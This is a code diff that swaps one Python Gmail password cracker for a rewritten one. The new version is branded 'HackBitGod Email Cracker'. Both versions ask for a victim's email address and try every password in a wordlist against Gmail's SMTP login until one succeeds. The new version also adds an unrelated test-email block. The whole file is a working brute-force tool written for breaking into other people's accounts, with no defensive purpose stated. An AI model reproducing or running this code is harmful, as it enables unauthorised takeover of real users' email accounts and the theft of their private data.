@@ -1,50 +1,113 @@
-#!/usr/bin/python
-'''create by Ha3MrX'''
-
 import smtplib
-from os import system
+import time
+import logging
+import os  # Import the 'os' module
 
-def main():
-   print ('=================================================')
-   print ('               create by Ha3MrX                  ')
-   print ('=================================================')
-   print ('               ++++++++++++++++++++              ')
+class Color:  # Class names should generally be capitalized
+    def __init__(self):
+        self.END = '\033[0m'
+        self.BOLD = '\033[1m'
+        self.YELLOW = '\033[93m'
 
+fa = Color()  # Use the capitalized class name
 
-main()
-print '[1] start the attack'
-print '[2] exit'
-option = input('==>')
-if option == 1:
-   file_path = raw_input('path of passwords file :')
-else:
-   system('clear')
-   exit()
-pass_file = open(file_path,'r')
-pass_list = pass_file.readlines()
-def login():
-    i = 0
-    user_name = raw_input('target email :')
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-    server.ehlo()
-    for password in pass_list:
-      i = i + 1
-      print str(i) + '/' + str(len(pass_list))
-      try:
-         server.login(user_name, password)
-         system('clear')
-         main()
-         print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
-         break
-      except smtplib.SMTPAuthenticationError as e:
-         error = str(e)
-         if error[14] == '<':
-            system('clear')
-            main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
+logo = fa.YELLOW + fa.BOLD + r'''
+_____ __  __    _   ___ _     ____ ____     _   ____ _  _______ ____
+| ____| \/ |   / \ |_ _| |   / ___| _ \   / \ / ___| |/ / ____| _ \
+|  _| | |\/| | / _ \ | || |   | |   | |_) | / _ \| |   | ' /|  _| | |_) |
+| |___| |  | |/ ___ \| || |___| |___| _ < / ___ \ |___| . \| |___| _ <
+|_____|_|  |_/_/   \_\___|_____|\____|_| \_\_/   \_\____|_|\_\_____|_|
 
-            break
-         else:
-            print '[!] password not found => ' + password
-login()
+                                                v1.0
+Coded By : Hack-BitGod
+''' + fa.END
+
+Prompt = fa.BOLD + "BitGod@Hack-BitGod:" + fa.END
+
+print(logo)
+print(Prompt)
+
+class Bcolors:  # Class names should generally be capitalized
+    OK = '\033[92m'
+    FAIL = '\033[91m'
+    BOLD = '\033[1m'
+    ENDC = '\033[0m'
+    UNDERLINE = '\033[4m'
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+def connect_to_smtp_server():
+    retries = 5
+    for i in range(retries):
+        try:
+            smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+            smtpserver.ehlo()
+            smtpserver.starttls()
+            logging.info("SMTP connection established successfully.")
+            return smtpserver
+        except (smtplib.SMTPConnectError, smtplib.SMTPServerDisconnected) as e:
+            logging.error(f"Attempt {i+1}/{retries} failed: {e}")
+            time.sleep(5)  # Wait for 5 seconds before retrying
+    raise Exception("Failed to connect to the SMTP server after several attempts.")
+
+try:
+    smtpserver = connect_to_smtp_server()
+
+    email_user = os.getenv('EMAIL_USER')
+    email_pass = os.getenv('EMAIL_PASS')
+
+    smtpserver.login(email_user, email_pass)
+    logging.info("Logged in successfully.")
+
+    from_addr = email_user
+    to_addr = "recipient_email@gmail.com"
+    subject = "Test Email"
+    body = "This is a test email."
+    msg = f"Subject: {subject}\n\n{body}"
+
+    smtpserver.sendmail(from_addr, to_addr, msg)
+    logging.info("Email sent successfully.")
+
+    smtpserver.quit()
+    logging.info("SMTP server connection closed.")
+except smtplib.SMTPAuthenticationError as auth_err:
+    logging.error(f"Authentication failed: {auth_err}")
+except smtplib.SMTPException as smtp_err:
+    logging.error(f"SMTP error occurred: {smtp_err}")
+except Exception as e:
+    logging.error(f"An unexpected error occurred: {e}")
+
+print(Bcolors.BOLD + "HackBitGod Email Cracker" + Bcolors.ENDC)
+print(Bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + Bcolors.ENDC)
+
+user = input("Enter The Victim's Email Address: ")
+passwfile_name = "psw.list"
+
+try:
+    with open(passwfile_name, "r") as passwfile:
+        smtpserver_guess = None  # Initialize outside the loop
+        try:
+            smtpserver_guess = smtplib.SMTP("smtp.gmail.com", 587)
+            smtpserver_guess.ehlo()
+            smtpserver_guess.starttls()
+            for password in passwfile:
+                password = password.strip()
+                try:
+                    smtpserver_guess.login(user, password)
+                    print(Bcolors.UNDERLINE + f"Password Found: {password}" + Bcolors.ENDC)
+                    break  # Exit the loop once the password is found
+                except smtplib.SMTPAuthenticationError:
+                    print(Bcolors.FAIL + f"Password Incorrect: {password}" + Bcolors.ENDC)
+                except Exception as e:
+                    print(Bcolors.FAIL + f"An error occurred during login attempt: {e}" + Bcolors.ENDC)
+            else:
+                print(Bcolors.FAIL + "Password not found in the list." + Bcolors.ENDC)
+        except smtplib.SMTPConnectError as e:
+            print(Bcolors.FAIL + f"Could not connect to SMTP server: {e}" + Bcolors.ENDC)
+        finally:
+            if smtpserver_guess:
+                smtpserver_guess.quit()
+except FileNotFoundError:
+    print(Bcolors.FAIL + f"Error: The file '{passwfile_name}' was not found." + Bcolors.ENDC)
+except Exception as e:
+    print(Bcolors.FAIL + f"An unexpected error occurred with the password list: {e}" + Bcolors.ENDC)
